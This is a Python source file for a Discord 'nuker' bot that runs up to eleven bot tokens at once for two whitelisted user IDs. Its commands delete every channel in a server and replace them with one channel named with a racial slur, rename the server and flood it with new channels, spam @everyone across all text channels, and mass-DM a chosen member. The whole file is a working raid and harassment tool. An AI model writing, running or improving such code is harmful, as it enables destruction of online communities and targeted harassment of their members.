import os
import asyncio
import discord
from discord.ext import commands

ALLOWED_USERS = {1491826888107364433, 1383785763501637674}

PREFIX = "$$"

BOT_TOKENS = [
    os.environ.get("BOT_TOKEN_1"),
    os.environ.get("BOT_TOKEN_2"),
    os.environ.get("BOT_TOKEN_3"),
    os.environ.get("BOT_TOKEN_4"),
    os.environ.get("BOT_TOKEN_5"),
    os.environ.get("BOT_TOKEN_6"),
    os.environ.get("BOT_TOKEN_7"),
    os.environ.get("BOT_TOKEN_8"),
    os.environ.get("BOT_TOKEN_9"),
    os.environ.get("BOT_TOKEN_10"),
    os.environ.get("BOT_TOKEN_11"),
]


def is_allowed(user_id: int) -> bool:
    return user_id in ALLOWED_USERS


def make_bot(index: int) -> commands.Bot:
    intents = discord.Intents.default()
    intents.message_content = True
    intents.guilds = True
    intents.members = True

    bot = commands.Bot(command_prefix=PREFIX, intents=intents)
    bot._bot_index = index

    @bot.event
    async def on_ready():
        try:
            synced = await bot.tree.sync()
            print(f"[Bot {index+1}] Logged in as {bot.user} | Synced {len(synced)} slash commands")
        except Exception as e:
            print(f"[Bot {index+1}] Failed to sync slash commands: {e}")

    @bot.tree.command(name="hi", description="Say hi!")
    async def slash_hi(interaction: discord.Interaction):
        if not is_allowed(interaction.user.id):
            await interaction.response.send_message("You are not allowed to use this bot.", ephemeral=True)
            return
        await interaction.response.send_message("hi again")

    @bot.command(name="clear")
    async def prefix_clear(ctx: commands.Context):
        if not is_allowed(ctx.author.id):
            await ctx.send("You are not allowed to use this command.")
            return
        guild = ctx.guild
        if guild is None:
            await ctx.send("This command must be used in a server.")
            return
        for channel in list(guild.channels):
            try:
                await channel.delete()
            except Exception as e:
                print(f"[Bot {index+1}] Could not delete channel {channel.name}: {e}")
        try:
            await guild.create_text_channel("nigga")
        except Exception as e:
            print(f"[Bot {index+1}] Could not create channel: {e}")

    @bot.command(name="create")
    async def prefix_create(ctx: commands.Context, name: str, num: int):
        if not is_allowed(ctx.author.id):
            await ctx.send("You are not allowed to use this command.")
            return
        guild = ctx.guild
        if guild is None:
            await ctx.send("This command must be used in a server.")
            return
        try:
            await guild.edit(name=name)
        except Exception as e:
            print(f"[Bot {index+1}] Could not rename server: {e}")

        for i in range(num):
            try:
                await guild.create_text_channel(f"{name}-{i+1}")
            except Exception as e:
                print(f"[Bot {index+1}] Could not create channel {name}-{i+1}: {e}")

        try:
            await ctx.send(f"Created {num} channel(s) named '{name}-1' through '{name}-{num}' and renamed server to '{name}'.")
        except Exception:
            pass

    @bot.command(name="setup")
    async def prefix_setup(ctx: commands.Context, number: int):
        if not is_allowed(ctx.author.id):
            await ctx.send("You are not allowed to use this command.")
            return
        guild = ctx.guild
        if guild is None:
            await ctx.send("This command must be used in a server.")
            return
        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]

        async def spam_channel(channel):
            for _ in range(number):
                try:
                    await channel.send("@everyone")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"[Bot {index+1}] Could not send to {channel.name}: {e}")

        await asyncio.gather(*[spam_channel(ch) for ch in text_channels])

    @bot.command(name="dmit")
    async def prefix_dmit(ctx: commands.Context, user: discord.Member, number: int):
        if not is_allowed(ctx.author.id):
            await ctx.send("You are not allowed to use this command.")
            return
        for _ in range(number):
            try:
                await user.send("@everyone")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"[Bot {index+1}] Could not DM {user}: {e}")
        try:
            await ctx.send(f"Sent {number} DM(s) to {user.mention}.")
        except Exception:
            pass

    return bot


async def run_bot(bot: commands.Bot, token: str, index: int):
    try:
        await bot.start(token)
    except Exception as e:
        print(f"[Bot {index+1}] Failed to start: {e}")


async def main():
    tasks = []
    for i, token in enumerate(BOT_TOKENS):
        if not token:
            print(f"[Bot {i+1}] No token found, skipping.")
            continue
        bot = make_bot(i)
        tasks.append(asyncio.create_task(run_bot(bot, token, i)))

    if not tasks:
        print("No bot tokens configured. Set BOT_TOKEN_1 through BOT_TOKEN_11 as environment secrets.")
        return

    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
